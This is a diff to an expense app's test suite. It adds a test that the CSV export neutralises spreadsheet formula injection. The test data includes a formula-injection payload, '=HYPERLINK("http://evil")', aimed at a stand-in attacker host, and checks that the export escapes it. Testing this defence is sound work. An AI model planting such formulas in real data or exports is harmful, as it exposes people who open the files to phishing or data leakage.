@@ -146,3 +146,14 @@ test('receipts: upload png+pdf, serve, delete; reject spoofed and oversize files
   await call('DELETE', `/api/expenses/${e.id}`);
   assert.equal((await fetch(`${base}/api/receipts/${pdf.file}`)).status, 404);
 });
+
+test('CSV export neutralises formulas and includes rows', async () => {
+  const p = (await call('POST', '/api/people', { name: 'Fay' })).body.person;
+  await call('POST', '/api/expenses', {
+    description: '=HYPERLINK("http://evil")', amount: 5, date: '2026-09-09',
+    paidBy: [{ personId: p.id }], participants: [{ personId: p.id }],
+  });
+  const csv = await (await fetch(`${base}/api/export/expenses.csv`)).text();
+  assert.match(csv, /'=HYPERLINK/);
+  assert.ok(!/,=HYPERLINK/.test(csv));
+});
